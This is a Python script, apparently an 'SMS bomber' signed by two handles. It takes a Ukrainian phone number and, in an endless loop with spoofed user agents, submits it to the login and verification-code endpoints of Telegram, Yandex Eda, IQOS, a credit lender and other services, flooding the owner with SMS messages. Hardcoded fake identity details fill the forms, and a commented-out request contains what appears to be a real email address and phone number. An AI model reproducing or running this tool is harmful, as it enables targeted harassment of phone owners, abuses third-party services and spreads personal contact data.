from user_agent import generate_user_agent
import threading
import requests

print(r"""
╔══╦╦══╦═╦╗╔═╗╔══╦══╦══╗╔═╦═╦══╦═╦═╦╦╗
╠╗╚╣║║║║╔╣╚╣╦╣╠╗╚╣║║╠╗╚╣║╣╣║║║║║╣╣╦╣╔╝
╚══╩╩╩╩╩╝╚═╩═╝╚══╩╩╩╩══╝╚═╩═╩╩╩╩═╩═╩╝
 by Wodn1k and IamJomm999                                                                                             

""")

password = str('Drg3ff3w3fhsd4')
mail = str('sobal52097@bio123.net')
last_name = str('Дмитрий')
first_name = str('Лось')
middle_name = str('Юлианович')
good = str('Запрос на СМС отправлен')
bad = str('Запрос на СМС не отправлен')


print('Введите номер без плюса: (380ХХХХХХХХХ):')
phone = input()
#phone = ''
phone_plus = '+' + str(phone)
cut_phone = str(phone[3:12])
def run():
    while True:
        head = {'User-Agent': generate_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}
    
        try:
            response = requests.post('https://auth.multiplex.ua/login', json = {'login': phone}, headers = head)
            print('Multiplex: ' + good)
        except Exception:
            print(bad)
        
        try:
            response = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': phone_plus}, headers = head)
            print('Yandex eda: ' + good)
        except Exception:
            print(bad)
        
        try:
            response = requests.post('https://md-fashion.com.ua/bpm/validate-contact', data = {'phone': phone_plus}, headers = head)
            print('MD Fashion: ' + good)
        except Exception:
            print(bad)

        try:
            response = requests.post('https://my.telegram.org/auth/send_password', data = {'phone': phone_plus}, headers = head)
            print('Telegram: ' + good)
        except Exception:
            print(bad)

        try:
            response = requests.post('https://my.xtra.tv/api/signup?lang=uk', data = {'phone': phone_plus}, headers = head)
            print('XTRA TV: ' + good)
        except Exception:
            print(bad)
        
        try:
            response = requests.get('https://findclone.ru/register', data = {'phone': phone}, headers = head)
            print('FindClone: ' + good)
        except Exception:
            print(bad)

        try:
            response = requests.post('https://credit7.ua/client/registration/general-information', data = {'last_name:': last_name, 'first_name': first_name, 'middle_name': middle_name, 'mobile_phone': phone_plus}, headers = head)
            print('Credit7: ' + good)
        except Exception:
            print(bad)

        try:
            response = requests.post('https://www.iqos.com.ua/index.php?dispatch=sms_validation.send_code', data = {'phone_number': phone_plus, 'is_ajax': '1'}, headers = head)
            print('IQOS: ' + good)
        except Exception:
            print(bad)

        """try:
            response = requests.post('https://www.moyo.ua/identity/registration', json = {'firstname': last_name, 'phone': phone_plus, 'email': mail}, headers = head)
            print('Moyo:' + good)
        except Exception:
            print(bad)
        
        try:
            response = requests.get('https://pizza33.ua/join/check/?callback=angular.callbacks._1&email=danyasem@gmail.com&password=12r12r1r@gmailcom&phone=0931838888&utm_campaign=&utm_content=&utm_current_visit_started=0&utm_first_visit=0&utm_medium=&utm_previous_visit=0&utm_source=&utm_term=&utm_times_visited=0', data = {'phone': "cut_phone", 'country_code': '380'}, headers = head)
            print('Parimatch: ' + good)
        except Exception:
            print(bad)"""

run()